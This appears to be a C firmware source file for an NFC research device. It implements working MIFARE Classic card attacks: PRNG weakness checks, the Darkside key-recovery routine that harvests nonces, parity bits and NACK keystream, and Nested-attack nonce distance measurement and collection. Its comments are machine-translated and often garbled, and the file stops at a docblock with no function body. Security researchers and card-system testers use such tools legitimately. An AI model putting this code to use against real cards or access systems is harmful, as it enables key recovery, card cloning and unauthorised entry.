#include "parity.h"
#include "bsp_delay.h"
#include "hex_utils.h"

#include "mf1_toolbox.h"
#include "mf1_crapto1.h"
#include "app_status.h"

#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"
#include "bsp_wdt.h"
#include "hw_connect.h"
#include "nrf_gpio.h"
#include "rgb_marquee.h"

// The default delay of the antenna reset
static uint32_t g_ant_reset_delay = 100;

// Label information used for global operations
static picc_14a_tag_t m_tag_info;
static picc_14a_tag_t *p_tag_info = &m_tag_info;


/**
* @brief    : Calculate the distance value of the random number, and calculate the multi -type table based on real -time
*               Official comment:x,y valid tag nonces, then prng_successor(x, nonce_distance(x, y)) = y
* @param    :msb :The random number is high, the result is completed, the pointer is completed
* @param    :lsb :The random number is low, and the result is completed
* @retval   : none
*
*/
static void nonce_distance(uint32_t *msb, uint32_t *lsb) {
    uint16_t x = 1, pos;
    uint8_t calc_ok = 0;

    for (uint16_t i = 1; i; ++i) {
        // Calculate coordinates to obtain polynomial step operation results
        pos = (x & 0xff) << 8 | x >> 8;
        // To judge the coordinates, we take out the corresponding value and set the logo bit with the value of the value
        if ((pos == *msb) & !(calc_ok >> 0 & 0x01)) {
            *msb = i;
            calc_ok |= 0x01;
        }
        if ((pos == *lsb) & !(calc_ok >> 1 & 0x01)) {
            *lsb = i;
            calc_ok |= 0x02;
        }
        // If the calculation of both values is completed, we will end the operation directly,
        // to reduce unnecessary subsequent CPU performance loss
        if (calc_ok == 0x03) {
            return;
        }
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15;
    }
}

/**
* @brief    : Calculate the step of PRNG to verify whether the random number is predictable
* If it is predictable, then DarkSide attack may be supported
* And may support Nested attack
* @param    :nonce  : Measured random number
* @retval   :   true = weak prng
*               false = hardened prng
*
*/
static bool check_lfsr_prng(uint32_t nonce) {
    // Give the initial coordinate value
    uint32_t msb = nonce >> 16;
    uint32_t lsb = nonce & 0xffff;
    //The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
    nonce_distance(&msb, &lsb);
    return ((65535 - msb + lsb) % 65535) == 16;
}

/**
* @brief    : Re -set the field, restart the field after a certain delay
*
*/
static inline void reset_radio_field_with_delay(void) {
    pcd_14a_reader_antenna_off();
    bsp_delay_ms(g_ant_reset_delay);
    pcd_14a_reader_antenna_on();
}

/**
* @brief    : Send the MiFare instruction
* @param    :pcs     : crypto1st handle
* @param    :encrypted : Whether these data need to be encrypted by Crypto1
* @param    :cmd     : The instructions that will be sent, for example, 0x60 indicates verification A key
* @param    :data    : The data that will be sent, such as 0x03 indicates verification 1 sector
* @param    :answer  : Card response data stored array
* @param    :answer_parity  : Card response data for the stagnant school inspection storage
* @retval   : The length of the card response data, this length is the length of the bit, not the length of Byte
*
*/
static uint8_t send_cmd(struct Crypto1State *pcs, uint8_t encrypted, uint8_t cmd, uint8_t data, uint8_t *status, uint8_t *answer, uint8_t *answer_parity, uint16_t answer_max_bit) {
    // Here we set directly to static
    static uint8_t pos;
    static uint16_t len;
    static uint8_t dcmd[4];
    static uint8_t ecmd[4];
    static uint8_t par[4];

    dcmd[0] = ecmd[0] = cmd;
    dcmd[1] = ecmd[1] = data;

    crc_14a_append(dcmd, 2);

    ecmd[2] = dcmd[2];
    ecmd[3] = dcmd[3];

    len = 0;

    if (pcs && encrypted) {
        for (pos = 0; pos < 4; pos++) {
            ecmd[pos] = crypto1_byte(pcs, 0x00, 0) ^ dcmd[pos];
            par[pos] = filter(pcs->odd) ^ oddparity8(dcmd[pos]);
        }
        *status = pcd_14a_reader_bits_transfer(
                      ecmd,
                      32,
                      par,
                      answer,
                      answer_parity,
                      &len,
                      answer_max_bit
                  );
    } else {
        *status = pcd_14a_reader_bytes_transfer(
                      PCD_TRANSCEIVE,
                      dcmd,
                      4,
                      answer,
                      &len,
                      answer_max_bit
                  );
    }

    // There is a problem with communication, do not continue the next task
    if (*status != STATUS_HF_TAG_OK) {
        return len;
    }

    if (encrypted == CRYPT_ALL) {
        if (len == 8) {
            uint16_t res = 0;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 0)) << 0;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 1)) << 1;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 2)) << 2;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 3)) << 3;
            answer[0] = res;
        } else {
            for (pos = 0; pos < len % 8; pos++)
                answer[pos] = crypto1_byte(pcs, 0x00, 0) ^ answer[pos];
        }
    }

    return len;
}

/**
* @brief    : Advanced verification process
* @param    :pcs      : crypto1st handle
* @param    :uid      : Card's UID number
* @param    :blockNo  : Verified block number
* @param    :keyType  : Type type, 0x60 (A key) or 0x61 (B secret)
* @param    :ui64Key  : The U64 value of the secret of the card
* @param    :isNested : Is it currently nested verification?
* @param    :ntptr    : Store the address of NT, if it is passed into NULL, it will not be saved
* @retval   : Verification returns 0, the verification is unsuccessful to return the non -0 value
*
*/
int authex(struct Crypto1State *pcs, uint32_t uid, uint8_t blockNo, uint8_t keyType, uint64_t ui64Key, uint8_t isNested, uint32_t *ntptr) {
    static uint8_t status;                                      // tag response status
    static uint16_t len;                                        // tag response length
    static uint32_t pos, nt, ntpp;                              // Supplied tag nonce
    static const uint8_t nr[]   = { 0x12, 0x34, 0x56, 0x78 };   // Use a fixed card to random NR, which is Nonce Reader.
    uint8_t par[]               = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t mf_nr_ar[]          = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t answer[]            = { 0x00, 0x00, 0x00, 0x00 };
    uint8_t parity[]            = { 0x00, 0x00, 0x00, 0x00 };

    len = send_cmd(pcs, isNested, keyType, blockNo, &status, answer, parity, U8ARR_BIT_LEN(answer));
    if (len != 32) {
        NRF_LOG_INFO("No 32 data recv on send_cmd: %d\r\n", len);
        return STATUS_HF_ERR_STAT;
    }

    // Save the tag nonce (nt)
    nt = BYTES4_TO_U32(answer);

    //  ----------------------------- crypto1 create
    if (isNested) {
        crypto1_deinit(pcs);
    }

    // Init cipher with key
    crypto1_init(pcs, ui64Key);

    if (isNested == AUTH_NESTED) {
        // decrypt nt with help of new key
        nt = crypto1_word(pcs, nt ^ uid, 1) ^ nt;
    } else {
        // Load (plain) uid^nt into the cipher
        crypto1_word(pcs, nt ^ uid, 0);
    }

    // save Nt
    if (ntptr)
        *ntptr = nt;

    // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
    for (pos = 0; pos < 4; pos++) {
        mf_nr_ar[pos] = crypto1_byte(pcs, nr[pos], 0) ^ nr[pos];
        par[pos] = filter(pcs->odd) ^ oddparity8(nr[pos]);
    }

    // Skip 32 bits in pseudo random generator
    nt = prng_successor(nt, 32);

    // ar+parity
    for (pos = 4; pos < 8; pos++) {
        nt = prng_successor(nt, 8);
        mf_nr_ar[pos] = crypto1_byte(pcs, 0x00, 0) ^ (nt & 0xff);
        par[pos] = filter(pcs->odd) ^ oddparity8(nt);
    }

    // We don't need Status, because normal communication will return 32bit data
    pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par, answer, parity, &len, U8ARR_BIT_LEN(answer));
    if (len == 32) {
        ntpp = prng_successor(nt, 32) ^ crypto1_word(pcs, 0, 0);
        if (ntpp == BYTES4_TO_U32(answer)) {
            // Successful verification!
            return STATUS_HF_TAG_OK;
        } else {
            // fail
            return STATUS_MF_ERR_AUTH;
        }
    }

    // fail!
    return STATUS_MF_ERR_AUTH;
}

/**
* @brief    : Selected the largest probability of NT
* @param    :tag             : Label information structure, fast selection card needs to use this structure
* @param    :block           : The key cubes that will be attacked
* @param    :keytype         : The type of key to be attacked
* @param    :nt              : The final selected NT, this NT is the most occurred, and the ranking is the highest.
* @retval The final NT value determined, if the card clock cannot be synchronized, returns the corresponding abnormal code, otherwise return hf_tag_ok
* -------------------
* Why can't you fix the random number?
* 0. The deviation of free or non -free movement in the card antenna leads to the unstable communication.
* 1. The electromagnetic environment where it is located is very complicated, resulting in the process of getting the power charging of the card to complete the communication.
* 2. The card is repaired for the loopholes for the heavy attack attack, and the card is no longer a replaceable attack set to take the same response
* 3. The environment run by this code is too frequent or interrupt, or other task scheduling is too frequent.
* As a result, the CPU cannot complete the replay attack within the same time.
* There is basically no solution in this situation. It is recommended to close the non -critical interruption and task scheduling outside this code
*/
static uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keytype, uint32_t *nt, mf1_darkside_status_t *darkside_status) {
#define NT_COUNT 15
    uint8_t tag_auth[4]         = { keytype, block, 0x00, 0x00 };
    uint8_t tag_resp[4]         = { 0x00 };
    uint8_t nt_count[NT_COUNT]  = { 0x00 };
    uint32_t nt_list[NT_COUNT]  = { 0x00 };
    uint8_t i, m, max, status;
    uint16_t len;

    crc_14a_append(tag_auth, 2);

    //Random number collection
    for (i = 0; i < NT_COUNT; i++) {
        bsp_wdt_feed();
        while (NRF_LOG_PROCESS());
        //When the antenna is reset, we must make sure
        // 1. The antenna is powered off for a long time to ensure that the card is completely powered off, otherwise the pseudo -random number generator of the card cannot be reset
        // 2. Moderate power -off time, don't be too long, it will affect efficiency, and don't be too short.
        reset_radio_field_with_delay();
        // After the power is completely disconnected, we will select the card quickly and compress the verification time as much as possible.
        if (pcd_14a_reader_fast_select(tag) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Tag can't select!\n");
            return STATUS_HF_TAG_NO;
        }
        status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tag_auth, 4, tag_resp, &len, U8ARR_BIT_LEN(tag_resp));
        // After finding the card, start collecting random numbers
        if (status != STATUS_HF_TAG_OK || len != 32) {
            NRF_LOG_INFO("Get nt failed.\n");
            return STATUS_HF_ERR_STAT;
        }
        // Converted to the type of U32 and cache
        nt_list[i] = bytes_to_num(tag_resp, 4);
        // The byte array of the conversion response is 10 in NT
        // NRF_LOG_INFO("Get nt: %"PRIu32, nt_list[i]);
    }

    // Take the random number
    for (i = 0; i < NT_COUNT; i++) {
        uint32_t nt_a = nt_list[i];
        for (m = i + 1; m < NT_COUNT; m++) {
            uint32_t nt_b = nt_list[m];
            if (nt_a == nt_b) {
                nt_count[i] += 1;
            }
        }
    }

    // Take the maximum number of times after weighting
    max = nt_count[0];
    m = 0;
    for (i = 1; i < NT_COUNT; i++) {
        if (nt_count[i] > max) {
            max = nt_count[i];
            m = i;
        }
    }

    //In the end, let's determine whether the number of MAX times is greater than 0,
    // If it is not greater than 0, it means that the clock cannot be synchronized.
    if (max == 0) {
        NRF_LOG_INFO("Can't sync nt.\n");
        *darkside_status = DARKSIDE_CANT_FIX_NT;
        return STATUS_HF_TAG_OK;
    }

    // NT is fixed successfully, the one with the highest number of times we take out
    // NRF_LOG_INFO("Sync nt: %"PRIu32", max = %d\n", nt_list[m], max);
    if (nt) *nt = nt_list[m];  // Only when the caller needs to get NT
    *darkside_status = DARKSIDE_OK;
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Using darkside vulnerability to crack an unknown key
* @param    :dc : DarkSide's core response
* @param    :dp : The core parameter of darkside cracking
* @retval   : Collect successfully returning hf_tag_ok, verify that the corresponding abnormal code is not successfully returned
*
*/
uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
                             uint8_t firstRecover, uint8_t ntSyncMax, DarksideCore_t *dc,
                             mf1_darkside_status_t *darkside_status) {

    // Card information for fixed use
    static uint32_t uid_ori                 = 0;
    uint32_t uid_cur                        = 0;

    // Fixed random number and random number of each time
    static uint32_t nt_ori                  = 0;
    uint32_t nt_cur                         = 0;

    // Mr_nr changes every time
    static uint8_t par_low                  = 0;
    static uint8_t mf_nr_ar3                = 0;

    // Card interaction communication                         Wow, so neat variable definition
    uint8_t tag_auth[4]                     = { targetTyp, targetBlk, 0x00, 0x00 };
    uint8_t par_list[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t ks_list[8]                      = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t mf_nr_ar[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    // During the real communication, the length of 8 byte is enough to accommodate all data
    uint8_t par_byte[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t dat_recv[8]                     = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    // Control variable
    uint8_t resync_count                    = 0x00;  // This variable is responsible for counting the current sync clock with the number of attempts of synchronous NT
    uint8_t received_nack                   = 0x00;  // This variable is responsible for whether it receives the reply from Nack
    uint8_t par                             = 0x00;  // This variable is responsible for increasing the puppet school inspection, and the reply of the collision card
    uint8_t status                          = 0x00;  // This variable is responsible for saving card communication status
    uint16_t len                            = 0x00;  // This variable is responsible for saving the data of the card in the communication process to respond to the length of the card
    uint8_t nt_diff                         = 0x00;  // This variable is critical, don't initialize it, because the following is used directly
    bool led_toggle                         = false;

    // We need to confirm the use of a certain card first
    if (pcd_14a_reader_scan_auto(p_tag_info) == STATUS_HF_TAG_OK) {
        uid_cur = get_u32_tag_uid(p_tag_info);
    } else {
        return STATUS_HF_TAG_NO;
    }

    // Verification instructions need to add CRC16
    crc_14a_append(tag_auth, 2);
    rgb_marquee_stop();
    set_slot_light_color(RGB_GREEN);
    uint32_t *led_pins = hw_get_led_array();
    for (uint8_t i = 0; i < RGB_LIST_NUM; i++) {
        nrf_gpio_pin_clear(led_pins[i]);
    }

    // Initialize the static variable if it is the first attack
    if (firstRecover) {
        // Reset key variable
        nt_ori      = 0;
        mf_nr_ar3   = 0;
        par_low     = 0;

        // For the first time, we need to use a card fixed
        uid_ori = get_u32_tag_uid(p_tag_info);

        // Then you need to fix a random number that may appear
        status = darkside_select_nonces(p_tag_info, targetBlk, targetTyp, &nt_ori, darkside_status);
        if ((status != STATUS_HF_TAG_OK) || (*darkside_status != DARKSIDE_OK)) {
            //The fixed random number failed, and the next step cannot be performed
            return status;
        }
    } else {
        // we were unsuccessful on a previous call.
        // Try another READER nonce (first 3 parity bits remain the same)
        mf_nr_ar3++;
        mf_nr_ar[3] = mf_nr_ar3;
        par = par_low;

        if (uid_ori != uid_cur) {
            *darkside_status = DARKSIDE_TAG_CHANGED;
            return STATUS_HF_TAG_OK;
        }
    }
    // Always collect different NACK under a large cycle
    do {
        bsp_wdt_feed();
        while (NRF_LOG_PROCESS());
        // update LEDs
        led_toggle ^= 1;
        if (led_toggle) {
            nrf_gpio_pin_set(led_pins[nt_diff]);
        } else {
            nrf_gpio_pin_clear(led_pins[nt_diff]);
        }
        // Reset the receiving sign of NACK
        received_nack = 0;

        //When the antenna is reset, we must make sure
        // 1. The antenna is powered off for a long time to ensure that the card is completely powered off, otherwise the pseudo -random number generator of the card cannot be reset
        // 2. Moderate power -off time, don't be too long, it will affect efficiency, and don't be too short.
        reset_radio_field_with_delay();

        //After the power is completely disconnected, we will select the card quickly and compress the verification time as much as possible.
        if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Tag can't select!\n");
            return STATUS_HF_TAG_NO;
        }

        status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tag_auth, 4, dat_recv, &len, U8ARR_BIT_LEN(dat_recv));

        // After finding the card, start collecting random numbers
        if (status != STATUS_HF_TAG_OK || len != 32) {
            NRF_LOG_INFO("Get nt failed.\n");
            return STATUS_HF_ERR_STAT;
        }

        //The byte array of the conversion response is 10 in NT
        nt_cur = bytes_to_num(dat_recv, 4);
        //NRF_LOG_INFO("Get nt: %"PRIu32, nt_cur);

        //Determine the clock synchronization (fixing NT)
        if (nt_cur != nt_ori) {
            // The random number is not synchronized, but we have chosen the random number
            // And the random number we chose was also successfully attacked
            // In other words, this error has no chance to correct the random number
            if (++resync_count == ntSyncMax) {
                NRF_LOG_INFO("Can't fix nonce.");
                *darkside_status = DARKSIDE_CANT_FIX_NT;
                return STATUS_HF_TAG_OK;
            }

            // When the clock is not synchronized, the following operation is meaningless
            // So directly skip the following operations, enter the next round of cycle,
            // God bless the next cycle to synchronize the clock.EssenceEssence
            // NRF_LOG_INFO("Sync nt -> nt_fix: %"PRIu32", nt_new: %"PRIu32"\r\n", nt_ori, nt_cur);
            continue;
        }
        //Originally, we only need to send PAR, and use every bit of them as a school test.
        // But the sending function we implemented only supports one UINT8_T, that is, a byte as a bit
        // Therefore, we need to replace the communication writing of PM3 into our.
        // There are not many times here anyway, we directly expand the code for conversion
        par_byte[0] = par >> 7 & 0x1;
        par_byte[1] = par >> 6 & 0x1;
        par_byte[2] = par >> 5 & 0x1;
        par_byte[3] = par >> 4 & 0x1;
        par_byte[4] = par >> 3 & 0x1;
        par_byte[5] = par >> 2 & 0x1;
        par_byte[6] = par >> 1 & 0x1;
        par_byte[7] = par >> 0 & 0x1;

        //NRF_LOG_INFO("DBG step%i par=%x", nt_diff, par);

        len = 0;
        pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par_byte, dat_recv, par_byte, &len, U8ARR_BIT_LEN(dat_recv));

        //Reset fixed random number upper limit count
        resync_count = 0;

        if (len == 4) {
            NRF_LOG_INFO("NACK acquired (%i/8)", nt_diff + 1);
            received_nack = 1;
        } else if (len == 32) {
            // did we get lucky and got our dummy key to be valid?
            // however we dont feed key w uid it the prng..
            NRF_LOG_INFO("Auth Ok, you are so lucky!\n");
            *darkside_status = DARKSIDE_LUCKY_AUTH_OK;
            return STATUS_HF_TAG_OK;
        }

        // Receive answer. This will be a 4 Bit NACK when the 8 parity bits are OK after decoding
        if (received_nack) {
            nrf_gpio_pin_set(led_pins[nt_diff]);
            if (nt_diff == 0) {
                // there is no need to check all parities for other nt_diff. Parity Bits for mf_nr_ar[0..2] won't change
                par_low = par & 0xE0;
            }

            par_list[nt_diff] = (par * 0x0202020202ULL & 0x010884422010ULL) % 1023;
            ks_list[nt_diff] = dat_recv[0] ^ 0x05;  // xor with NACK value to get keystream

            // Test if the information is complete
            if (nt_diff == 0x07) {
                break;
            }

            nt_diff = (nt_diff + 1) & 0x07;
            mf_nr_ar[3] = (mf_nr_ar[3] & 0x1F) | (nt_diff << 5);
            par = par_low;
        } else {
            // No NACK.
            if (nt_diff == 0) {
                par++;
                if (par == 0) {    // tried all 256 possible parities without success. Card doesn't send NACK.
                    NRF_LOG_INFO("Card doesn't send NACK.\r\n");
                    *darkside_status = DARKSIDE_NO_NAK_SENT;
                    return STATUS_HF_TAG_OK;
                }
            } else {
                par = ((par + 1) & 0x1F) | par_low;
                if (par == par_low) {    // tried all 32 possible parities without success. Got some NACK but not all 8...
                    NRF_LOG_INFO("Card sent only %i/8 NACK.", nt_diff);
                    return DARKSIDE_NO_NAK_SENT;
                }
            }
        }
    } while (1);

    mf_nr_ar[3] &= 0x1F;

    // There is no accident, this execution is judged as success!
    // We need to package the result and return

    get_4byte_tag_uid(p_tag_info, dc->uid);
    num_to_bytes(nt_cur, 4, dc->nt);
    memcpy(dc->par_list, par_list, sizeof(dc->par_list));
    memcpy(dc->ks_list, ks_list, sizeof(dc->ks_list));
    memcpy(dc->nr, mf_nr_ar, sizeof(dc->nr));
    memcpy(dc->ar, mf_nr_ar + 4, sizeof(dc->ar));

    // NRF_LOG_INFO("Darkside done!\n");
    *darkside_status = DARKSIDE_OK;
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Modify the middle delay of the antenna restart
*               The longer the delay, the more you can restart certain non -standard cards, the more
*               The shorter the delay, the more you get the process of processing the antenna restart, and then deal with the follow -up business
* @param    :delay_ms   : The specific value of the delay, the unit is milliseconds
* @retval   : none
*
*/
void antenna_switch_delay(uint32_t delay_ms) {
    g_ant_reset_delay = delay_ms;
}

/**
* @brief    : Determine whether this card supports M1 verification steps
* @retval   : If support, it will return hf_tag_ok,
*              If it is not supported, returns the corresponding error code
*
*/
uint8_t check_tag_response_nt(picc_14a_tag_t *tag, uint32_t *nt) {
    struct Crypto1State mpcs            = { 0, 0 };
    struct Crypto1State *pcs            = &mpcs;
    uint8_t par_recv[4]                 = { 0x00 };
    uint8_t dat_recv[4]                 = { 0x00 };
    uint8_t status;

    // Reset card communication
    pcd_14a_reader_halt_tag();

    // We will choose a fast card, and we will be compressed to verify as much as possible
    if (pcd_14a_reader_fast_select(tag) != STATUS_HF_TAG_OK) {
        NRF_LOG_INFO("Tag can't select\r\n");
        return STATUS_HF_TAG_NO;
    }

    // Send instructions and get NT return
    *nt = send_cmd(pcs, AUTH_FIRST, PICC_AUTHENT1A, 0x03, &status, dat_recv, par_recv, U8ARR_BIT_LEN(dat_recv));
    if (*nt != 32) {
        // NRF_LOG_INFO("No 32 data recv on send_cmd: %d\n", *nt);
        return STATUS_HF_ERR_STAT;
    }
    *nt = bytes_to_num(dat_recv, 4);
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Determine whether this card supports the label MF three verification protocols
* @retval   : If support, return hf_tag_ok, if it is not supported,
*             Then return hf_errstat
* Or other card -related communication errors, the most common thing is
* Lost card hf_tag_no and wrong status hf_errstat
*
*/
uint8_t check_std_mifare_nt_support(void) {
    uint32_t nt1 = 0;

    // Find card, search on the field
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }

    // Get NT and return status
    return check_tag_response_nt(p_tag_info, &nt1);
}

/**
* @brief    :Determine whether this card supports StaticNESTED attack
* @retval   : If support, return nested_tag_is_static, if it is not supported, if support, return nested_tag_is_static, if it is not supported, if it is not supported, it is not supported,
* If support, return nested_tag_is_static, if not support,
*
*/
uint8_t check_static_prng(bool *is_static) {
    uint32_t nt1, nt2;
    uint8_t status;

    // Find card, search on the field
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }

    // Get NT in the first wave
    status = check_tag_response_nt(p_tag_info, &nt1);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }

    // Remember to reset the place after getting completed
    // If you do not re -set the field, some cards will always provide a static NT when maintaining the function in the field
    // Therefore, resetting here is very important.
    reset_radio_field_with_delay();

    // Get NT in the second wave
    status = check_tag_response_nt(p_tag_info, &nt2);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }

    // Detect whether the random number is static
    *is_static = (nt1 == nt2);
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Determine whether this card supports the most common, weaker, and easiest nested attack, or static, or hardnested
* @retval   : critical result
*
*/
uint8_t check_prng_type(mf1_prng_type_t *prng_type) {
    uint8_t status;
    uint32_t nt1;

    bool is_static;
    status = check_static_prng(&is_static);

    // If the judgment process is found, it is found that the StaticNested detection cannot be completed
    // Then return the state directly, no need to perform the following judgment logic.
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }
    if (is_static) {
        *prng_type = PRNG_STATIC;
        return STATUS_HF_TAG_OK;
    }

    // Non -Static card, you can continue to run down logic
    // ------------------------------------

    // Before you re -operate, try a dormant label
    // to reset the state machine where it may have problems
    pcd_14a_reader_halt_tag();

    // Card search operation
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }

    //Get NT, just get it once
    status = check_tag_response_nt(p_tag_info, &nt1);
    if (status != STATUS_HF_TAG_OK) {
        return status;
    }

    //Calculate the effectiveness of NT
    if (check_lfsr_prng(nt1)) {
        // NRF_LOG_INFO("The tag support Nested\n");
        *prng_type = PRNG_WEAK;
    } else {
        // NRF_LOG_INFO("The tag support HardNested\n");
        // NT is unpredictable and invalid.
        *prng_type = PRNG_HARD;
    }

    // ------------------------------------
    // end

    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Calculate the distance between the two random numbers
* @param    :from   : From which random number
* @param    :to     :Which random number is over
* @retval   : Distance value
*
*/
static uint32_t measure_nonces(uint32_t from, uint32_t to) {
    // Give the initial coordinate value
    uint32_t msb = from >> 16;
    uint32_t lsb = to >> 16;
    // The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
    nonce_distance(&msb, &lsb);
    return (65535 + lsb - msb) % 65535;
}

/**
* @brief    : Intermediate value measurement
* @param    :src    :Measurement source
* @param    :length :The number of measurement sources
* @retval   : Median
*
*/
uint32_t measure_median(uint32_t *src, uint32_t length) {
    uint32_t len = length;
    uint32_t minIndex;
    uint32_t temp, i;

    if (length == 1) {
        return src[0];
    }

    for (i = 0; i < len; i++) {
        //i is the end of the sequence that has been arranged
        minIndex = i;
        for (int j = i + 1; j < len; j++) {
            if (src[j] < src[minIndex]) {
                minIndex = j;
            }
        }
        if (minIndex != i) {
            temp = src[i];
            src[i] = src[minIndex];
            src[minIndex] = temp;
        }
    }
    return src[length / 2 - 1];
}

/**
* @brief    :The distance should be measured before the Nested attack. If the distance is appropriate, you can quickly crack
* @param    :u64Key  : The U64 value of the secret of the card
* @param    :block    :Verified block number
* @param    :type     :Type type, 0x60 (A key) or 0x61 (B secret)
* @param    :distance : Final distance
* @retval   : Operating result
*
*/
static uint8_t measure_distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t *distance) {
    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs = &mpcs;
    uint32_t distances[DIST_NR] = { 0x00 };
    uint32_t uid = get_u32_tag_uid(p_tag_info);
    uint32_t nt1, nt2;
    uint8_t index = 0;

    do {
        // Reset card communication
        pcd_14a_reader_halt_tag();
        // We will choose a fast card, and we will be compressed to verify as much as possible
        if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Tag can't select\r\n");
            return STATUS_HF_TAG_NO;
        }
        // Perform the first verification in order to obtain the unblocked NT1
        if (authex(pcs, uid, block, type, u64Key, AUTH_FIRST, &nt1) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Auth failed 1\r\n");
            return STATUS_MF_ERR_AUTH;
        }
        // Met the nested verification to obtain the encrypted NT2_ENC
        if (authex(pcs, uid, block, type, u64Key, AUTH_NESTED, &nt2) != STATUS_HF_TAG_OK) {
            NRF_LOG_INFO("Auth failed 2\r\n");
            return STATUS_MF_ERR_AUTH;
        }
        // Determine whether the two random numbers are the same, under normal circumstances,
        // We can't bring the same random number, because PRNG is updating chip at any time
        // If you really encounter the same NT, then it can only be explained that this card is a ST card for special firmware
        if (nt1 == nt2) {
            NRF_LOG_INFO("StaticNested: %08x vs %08x\n", nt1, nt2);
            *distance = 0;
            return STATUS_HF_TAG_OK;
        }
        // After the measurement is completed, store in the buffer
        distances[index++] = measure_nonces(nt1, nt2);
        // NRF_LOG_INFO("dist = %"PRIu32"\n\n", distances[index - 1]);
    } while (index < DIST_NR);

//The final calculation of the distance between the two NTs and spread it directly
    *distance =  measure_median(distances, DIST_NR);
// You need to return the OK value to successfully log in
    return STATUS_HF_TAG_OK;
}

/**
* @brief    : Nested core, used to collect random numbers. This function is only responsible for collecting, not responsible for conversion and analysis as KS
* @param    :pnc         :Nested core structure, save related communication data
* @param    :keyKnown    : The U64 value of the known secret key of the card
* @param    :blkKnown    :The owner of the known secret key of the card
* @param    :typKnown    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
* @param    :targetBlock : The target sector that requires a Nested attack
* @param    :targetType  :The target key type requires the Nested attack
* @retval   : Successfully return hf_tag_ok, verify the unsuccessful return of the non -hf_tag_ok value
*
*/
static uint8_t nested_recover_core(mf1_nested_core_t *pnc, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType) {
    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs = &mpcs;
    uint8_t status;
    uint8_t parity[4] = {0x00};
    uint8_t answer[4] = {0x00};
    uint32_t uid, nt1;
    //Convert UID to U32 type, which can be used later
    uid = get_u32_tag_uid(p_tag_info);
    // Reset card communication
    pcd_14a_reader_halt_tag();
    // Quickly select the card to complete the verification steps to collect NT1 and NT2_ENC
    if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
        return STATUS_HF_TAG_NO;
    }
    //The first step verification, basic verification does not require nested and encrypted
    if (authex(pcs, uid, blkKnown, typKnown, keyKnown, AUTH_FIRST, &nt1) != STATUS_HF_TAG_OK) {
        return STATUS_MF_ERR_AUTH;
    }
    // Then there is nested verification
    if (send_cmd(pcs, AUTH_NESTED, targetType, targetBlock, &status, answer, parity, U8ARR_BIT_LEN(answer)) != 32) {
        return STATUS_HF_ERR_STAT;
    };
    // The first verified explicitly random number
    num_to_bytes(nt1, 4, pnc->nt1);
    // The random number of the password encryption of the nested verification verification
    memcpy(pnc->nt2, answer, 4);
    //Save 3 bit's puppet test seats
    pnc->par = 0;
    pnc->par |= ((oddparity8(answer[0]) != parity[0]) << 0);
    pnc->par |= ((oddparity8(answer[1]) != parity[1]) << 1);
    pnc->par |= ((oddparity8(answer[2]) != parity[2]) << 2);
    pnc->par |= ((oddparity8(answer[3]) != parity[3]) << 3);
    return STATUS_HF_TAG_OK;
}

/**
* @brief    :NESTED is implemented by default to collect random numbers of the sets_nr group. This function is only responsible for collecting, not responsible for conversion and analysis as KS
* @param    :keyKnown    : The U64 value of the known secret key of the card
* @param    :blkKnown    :The owner of the known secret key of the card
* @param    :typKnown    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
* @param    :targetBlock : The target sector that requires a Nested attack
* @param    :targetType  : The target key type requires the Nested attack
* @param    :ncs         : Nested core structure array, save related communication data
* @retval   :The attack success return STATUS_HF_TAG_OK, else return the error code
*
*/
